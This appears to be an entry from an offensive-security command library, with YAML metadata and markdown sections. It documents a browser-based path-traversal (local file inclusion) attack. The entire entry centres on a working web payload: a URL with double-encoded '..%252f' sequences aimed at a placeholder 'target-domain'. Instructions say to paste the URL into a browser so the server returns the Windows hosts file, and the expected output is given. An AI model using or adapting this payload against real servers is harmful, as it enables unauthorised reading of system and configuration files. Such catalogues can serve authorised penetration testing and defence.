---
id: cmd-uuid-3
data: >-
  https://target-domain/gwtmain//..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/System32/drivers/etc/hosts
tags:
  - path-traversal
  - lfi
  - browser
type: command
output: null
executor: browser
platforms:
  - Web
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:19.923Z'
verified: false
validated: true
submitted: true
---
# browser-path-traversal-hosts

## Command

Navigate to: https://target-domain/gwtmain//..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/System32/drivers/etc/hosts

## Description

Browser-based exploitation of path traversal to display the Windows hosts file contents directly in the page.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `URL Path` | Full traversal URL to hosts file | Yes |

## Examples

### Basic Usage

Paste the URL into any modern browser address bar.

### Advanced Usage

Use browser dev tools to inspect response headers for confirmation.

## Expected Output

Page renders the raw hosts file text.

## Related

- [[Related Procedure: Exploit-Path-Traversal-for-POC-File-Read]]
